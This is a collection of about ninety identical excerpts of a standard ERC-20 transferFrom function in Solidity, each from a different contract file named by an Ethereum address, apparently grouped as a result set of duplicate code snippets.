<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="89" endline="98" pcid="164">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="85" endline="94" pcid="364">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="86" endline="95" pcid="4876">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="86" endline="95" pcid="6873">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="86" endline="95" pcid="6039">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="86" endline="95" pcid="8383">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="89" endline="98" pcid="1404">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="89" endline="98" pcid="6233">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="89" endline="98" pcid="4436">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="91" endline="100" pcid="1869">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="69" endline="78" pcid="3855">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="89" endline="98" pcid="2916">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="88" endline="97" pcid="1009">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="86" endline="95" pcid="2931">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="89" endline="98" pcid="2901">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="84" endline="93" pcid="2514">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="87" endline="96" pcid="2946">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="89" endline="98" pcid="9148">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="86" endline="95" pcid="7431">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="85" endline="94" pcid="5738">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="85" endline="94" pcid="8696">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="93" endline="102" pcid="2529">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="86" endline="95" pcid="668">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="85" endline="94" pcid="1464">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="85" endline="94" pcid="8995">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="90" endline="99" pcid="8726">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="85" endline="94" pcid="8023">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="87" endline="96" pcid="5633">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="88" endline="97" pcid="7041">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="85" endline="94" pcid="3990">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="91" endline="100" pcid="8473">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="179" endline="188" pcid="621">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="85" endline="94" pcid="8187">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="89" endline="98" pcid="4664">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="89" endline="98" pcid="5452">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="84" endline="93" pcid="8008">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="88" endline="97" pcid="2965">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="85" endline="94" pcid="6989">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="89" endline="98" pcid="823">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="86" endline="95" pcid="2886">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="87" endline="96" pcid="437">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="89" endline="98" pcid="4951">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="85" endline="94" pcid="5392">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="87" endline="96" pcid="964">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="89" endline="98" pcid="2980">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="88" endline="97" pcid="8095">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="86" endline="95" pcid="6689">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="87" endline="96" pcid="2871">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="86" endline="95" pcid="838">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="87" endline="96" pcid="552">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="88" endline="97" pcid="6323">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="92" endline="101" pcid="8172">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="89" endline="98" pcid="7808">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="91" endline="100" pcid="6203">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="85" endline="94" pcid="2995">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="82" endline="91" pcid="3843">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="88" endline="97" pcid="9047">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="87" endline="96" pcid="3010">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="92" endline="101" pcid="567">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="88" endline="97" pcid="2856">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="87" endline="96" pcid="2544">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="413" endline="422" pcid="3031">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="87" endline="96" pcid="5359">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="89" endline="98" pcid="2841">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="85" endline="94" pcid="2826">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="90" endline="99" pcid="2468">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="87" endline="96" pcid="3062">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="88" endline="97" pcid="3077">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="94" endline="103" pcid="8771">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="87" endline="96" pcid="7963">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="89" endline="98" pcid="3092">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="86" endline="95" pcid="4695">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="89" endline="98" pcid="8443">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="69" endline="78" pcid="594">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="87" endline="96" pcid="2805">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="87" endline="96" pcid="2453">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="86" endline="95" pcid="5377">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="89" endline="98" pcid="3107">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="91" endline="100" pcid="3122">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="87" endline="96" pcid="2789">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="89" endline="98" pcid="2438">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="84" endline="93" pcid="8038">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="86" endline="95" pcid="3137">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="91" endline="100" pcid="2578">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="86" endline="95" pcid="3152">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="177" endline="186" pcid="3167">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="87" endline="96" pcid="5190">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="90" endline="99" pcid="4351">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="85" endline="94" pcid="5205">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="82" endline="91" pcid="9079">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="86" endline="95" pcid="281">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="89" endline="98" pcid="3873">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="89" endline="98" pcid="7544">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
